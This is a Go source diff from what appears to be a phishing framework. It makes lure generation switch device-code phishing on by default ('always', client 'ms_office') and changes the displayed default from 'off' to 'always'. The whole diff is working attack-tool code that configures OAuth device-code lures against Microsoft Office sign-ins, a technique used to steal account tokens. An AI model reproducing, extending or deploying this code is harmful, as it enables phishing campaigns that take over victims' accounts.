@@ -370,9 +370,11 @@ func (t *Terminal) handleQuickstart(args []string) error {
 	startID := len(t.cfg.lures)
 	for _, theme := range themes {
 		l := &Lure{
-			Path:            "/" + GenRandomLurePath(),
-			Phishlet:        phishlet,
-			DeviceCodeTheme: theme.name,
+			Path:             "/" + GenRandomLurePath(),
+			Phishlet:         phishlet,
+			DeviceCodeTheme:  theme.name,
+			DeviceCodeMode:   DCModeAlways,
+			DeviceCodeClient: "ms_office",
 		}
 		t.cfg.AddLure(phishlet, l)
 	}
@@ -2092,9 +2094,11 @@ func (t *Terminal) handleLures(args []string) error {
 				startID := len(t.cfg.lures)
 				for i, theme := range themes {
 					l := &Lure{
-						Path:            "/" + GenRandomLurePath(),
-						Phishlet:        args[1],
-						DeviceCodeTheme: theme.name,
+						Path:             "/" + GenRandomLurePath(),
+						Phishlet:         args[1],
+						DeviceCodeTheme:  theme.name,
+						DeviceCodeMode:   DCModeAlways,
+						DeviceCodeClient: "ms_office",
 					}
 					t.cfg.AddLure(args[1], l)
 					lureID := startID + i
@@ -2654,7 +2658,7 @@ func (t *Terminal) handleLures(args []string) error {
 			// Device code details
 			dcMode := l.DeviceCodeMode
 			if dcMode == "" {
-				dcMode = "off"
+				dcMode = "always"
 			}
 			dcTheme := l.DeviceCodeTheme
 			if dcTheme == "" {
@@ -3623,7 +3627,7 @@ func (t *Terminal) sprintLures() string {
 		// Device code mode display
 		dcMode := l.DeviceCodeMode
 		if dcMode == "" {
-			dcMode = "off"
+			dcMode = "always"
 		}
 		var dcStr string
 		switch dcMode {
